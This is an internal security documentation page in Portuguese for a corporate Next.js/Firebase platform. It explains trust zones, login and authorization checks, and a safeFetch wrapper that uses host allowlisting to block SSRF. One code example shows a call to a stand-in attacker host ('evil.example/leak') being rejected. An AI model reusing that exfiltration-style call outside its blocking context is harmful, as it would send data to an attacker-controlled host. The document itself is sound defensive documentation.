Overview Trust Boundaries APIs Findings Supply Chain
Trust boundary (fronteira de confianca) e o ponto onde a identidade e a permissao do solicitante mudam. Toda requisicao comeca na zona de menor confianca (Zona 0 - publico anonimo) e, para chegar a qualquer dado sensivel, precisa passar por travessias. Cada travessia tem um fiscal (codigo ou regra) que decide se voce sobe de nivel.

As 6 zonas

0
Zona 0

Publico anonimo

Qualquer pessoa do mundo chegando na URL sem ter feito login. Nao apresentou credencial nenhuma. O servidor nao sabe quem e essa pessoa: pode ser um colaborador legitimo, um colega da pessoa, um bot, um atacante.

O que ela pode ver:

  • A tela de /login (precisa ser publica, senao ninguem loga).
  • O documento systemSettings/public_config, que por contrato contem apenas maintenanceMode e maintenanceMessage. Esta aberto para mostrar a mensagem de manutencao antes do login.
  • Arquivos estaticos (imagens, favicon).

Por que se chama anonimo: nao e que o usuario seja mal-intencionado; e que ninguem ainda provou quem e. Default para todo mundo que chega.

1
Zona 1

Autenticado corporativo

Usuario fez login via Google com conta @venetomfo.com.br e o Firebase Auth aceitou. Agora o server sabe o uid e o email (verificados pelo Google).

O que ele pode fazer:

  • Ler colecoes do Firestore marcadas como isAuthenticated() nas rules (colaboradores, mural, documentos...).
  • Chamar rotas /api/* protegidas por requireCorporateUser.

Ainda nao sabemos se ele e super admin, e nao validamos que ele esta cadastrado na base de colaboradores (isso acontece logo depois, no AuthContext).

2
Zona 2

Super admin

Um subconjunto pequeno da Zona 1. E uma pessoa da Zona 1 cujo email consta em systemSettings/config.superAdminEmails (ou em admin_config quando a migracao do Bloco 7 concluir).

Privilegios:

  • Escrever em systemSettings, gerenciar colaboradores em lote, trocar modo de manutencao.
  • Acessar /api/billing, /api/admin/settings.
  • Bypass do modo manutencao (pode entrar mesmo com plataforma "fechada").
3
Zona 3

Server Next.js

Este nao e um usuario; e o processo do lado da Vercel executando o codigo das rotas /api/*. Ele carrega FIREBASE_ADMIN_* do env, o que significa que roda com poderes de administrador no Firebase.

Por isso so codigo confiavel roda aqui. Toda chamada externa feita a partir desta zona precisa passar pelo safeFetch.

O que e safeFetch?

E uma funcao propria do projeto (src/lib/security/http.ts) que substitui o fetch normal sempre que o server precisa falar com um sistema externo (Google, BrasilAPI, InfoMoney). Antes de fazer a requisicao, ela aplica quatro protecoes:

  • Allowlist de host: o chamador passa uma lista de hosts permitidos (ex: ['www.googleapis.com']). Qualquer outra URL e rejeitada imediatamente com OutboundHttpError 403, sem nem tentar a conexao.
  • Timeout: a requisicao e abortada depois de um limite configurado (ex: 5 segundos). Isso impede o server de ficar pendurado esperando um upstream lento.
  • Erros uniformes: se falhar, devolve sempre um OutboundHttpError (nao uma stack trace qualquer do fetch). Facilita log e resposta ao cliente.
  • Metodo controlado: por padrao, so deixa GET. Evita acidente de escrita em servico externo.

Por que importa? Sem safeFetch, um bug ou vulnerabilidade poderia levar o server a requisitar qualquer URL que um atacante quisesse - padrao classico de SSRF (Server-Side Request Forgery). Com allowlist, o ataque morre antes de sair da maquina.

Exemplo pratico:

// OK - host na allowlist
const r = await safeFetch('https://www.googleapis.com/calendar/v3/...', {
  allowedHosts: ['www.googleapis.com'],
  timeoutMs: 5000,
});

// BLOQUEADO - nem tenta conectar
await safeFetch('https://evil.example/leak', {
  allowedHosts: ['www.googleapis.com'],
});
// Throws: OutboundHttpError "Destino externo nao permitido." status 403

Convencao do projeto: nenhuma rota em src/app/api/*/route.ts pode usar fetch cru para host externo. Tem que passar por safeFetch.

4
Zona 4

Firebase / Firestore

O banco e os servicos do Firebase. Quem decide o que pode ser lido/escrito e o arquivo firestore.rules. Essa e a autoridade final para acessos feitos via SDK client-side.

Quando o server-side usa Admin SDK, as regras sao ignoradas (poder total). E por isso que a chave Admin precisa ficar guardada.

5
Zona 5

Servicos externos

Google Calendar API, BrasilAPI (feriados), InfoMoney RSS. Sao sistemas fora do controle da Vêneto. Toda conversa com eles passa por safeFetch com allowlist.

Travessias - passo a passo

Abaixo, a sequencia completa do que acontece quando um usuario entra na plataforma e faz uma acao. Cada seta e uma travessia entre zonas, com seu fiscal proprio.

Travessia 0 -> 1: login Google

  1. Usuario abre /login (ainda na Zona 0).
  2. Clica em "Entrar com Google". O componente src/app/(auth)/login/page.tsx chama signInWithGoogle() do AuthContext.
  3. Firebase abre o popup do Google, que exige hd: venetomfo.com.br (hosted domain). Google nao deixa outras contas sequer aparecerem.
  4. Se o usuario autorizar, o Google emite um ID token JWT assinado.
  5. O Firebase Auth valida a assinatura e cria sessao local.
  6. O AuthContext ainda confere isCorporateEmail(email). Se o email nao termina com @venetomfo.com.br, faz signOut imediato.
  7. Passou? Um cookie cv_auth=1 e gravado (24h, SameSite=Lax). A sessao existe.
Fiscal: Google (hd) + Firebase Auth (assinatura) + isCorporateEmail (dominio) + AuthContext (fallback)

Travessia 1 -> bloqueio por manutencao (opcional)

  1. AuthContext chama /api/me/session passando o ID token no header Authorization: Bearer.
  2. Server-side, requireCorporateUser verifica o token com Admin SDK e descobre o email.
  3. O server le systemSettings/admin_config (ou fallback config) e decide se a pessoa e super admin. Retorna { isSuperAdmin, maintenanceMode, maintenanceMessage, isAllowedDuringMaintenance }.
  4. Se maintenanceMode=true e o usuario nao e super admin nem tem isAllowedDuringMaintenance=true, o AuthContext faz signOut com toast "Manutencao".
Fiscal: /api/me/session + AuthContext

Travessia 1 -> navegacao protegida (middleware)

  1. Usuario clica em /dashboard (ou qualquer rota protegida).
  2. O middleware.ts (rodando na borda da Vercel, antes de qualquer pagina) intercepta a request.
  3. Confere o cookie cv_auth. Se nao existir, redireciona para /login?next=/dashboard.
  4. Se existir, passa. A pagina comeca a renderizar.
Fiscal: middleware.ts + cookie cv_auth

Nota: middleware e UX. Ele so decide se a pagina abre ou nao. A autorizacao real de dado continua nas proximas travessias.

Travessia 1 -> 4: leitura direta do Firestore (via SDK client)

  1. A pagina (ex: dashboard, colaboradores) usa o SDK do Firebase Web para fazer getDoc / getDocs.
  2. O SDK envia a requisicao com o ID token do usuario.
  3. O Firestore executa as regras de firestore.rules. Se a regra for allow read: if isAuthenticated(), permite. Se for isSuperAdmin(), so super admin passa. Se nao tem regra permissiva, devolve permission-denied.
Fiscal: firestore.rules

E por isso que firestore.rules e o documento mais critico do projeto: e a unica autoridade quando o client fala com o banco diretamente.

Travessia 1 -> 3 -> 4: chamada a uma rota /api/*

  1. Client chama, por exemplo, /api/calendar?timeMin=...&timeMax=... com Authorization: Bearer <ID token>.
  2. A rota em src/app/api/calendar/route.ts chama requireCorporateUser. Se token invalido ou fora do dominio corporativo, responde 401/403.
  3. Zod valida os parametros (timeMin, timeMax). Falha -> 400.
  4. A rota chama safeFetch para www.googleapis.com. Outros hosts sao bloqueados com 403.
  5. Se o upstream falha ou excede o limite, devolve 502 uniforme.
  6. Se tudo ok, retorna JSON limpo com items.
Fiscal: requireCorporateUser + validateSearchParams + safeFetch + logSecurityEvent

Travessia 1 -> 2 -> 3: acao de super admin

  1. Usuario acessa /api/billing (ou /api/admin/settings).
  2. A rota chama requireSuperAdmin, que:
    • Primeiro valida o token (requireCorporateUser).
    • Depois le systemSettings/config.superAdminEmails via Admin SDK e confere se o email esta la.
  3. Se nao estiver, responde 403 FORBIDDEN_SUPER_ADMIN_REQUIRED.
  4. Se estiver, executa a operacao sensivel e loga via logSecurityEvent.
Fiscal: requireSuperAdmin = requireCorporateUser + checagem de lista no server

Travessia 3 -> 5: chamada a servico externo

  1. A rota quer conversar com um sistema fora (Calendar, BrasilAPI, InfoMoney).
  2. Obriga-se a usar safeFetch(url, { allowedHosts, timeoutMs }).
  3. Se a URL nao esta na allowlist -> OutboundHttpError 403. A request nem sai.
  4. Se sair e passar do timeoutMs -> 504.
  5. Em caso de /api/rss tambem checa content-type e limita body a 2 MB.
Fiscal: safeFetch + allowlist por rota

Conclusao pratica

  • Zona 0 e publica por necessidade, nao por descuido. Se voce nao pode fechar /login, nao consegue deixar ninguem entrar.
  • A travessia 0 -> 1 e a mais sensivel, e por isso tem tres camadas de fiscal em serie (Google, Firebase, isCorporateEmail).
  • O middleware e defesa fraca (UX). Protecao de dado real esta nas travessias 1 -> 4 (firestore.rules) e 1 -> 3 (requireCorporateUser).
  • Zona 2 (super admin) existe server-side, nao e atributo do usuario. E recalculada a cada request via requireSuperAdmin.
  • Zona 5 e sempre tratada como hostil. Mesmo Google e BrasilAPI passam por safeFetch.
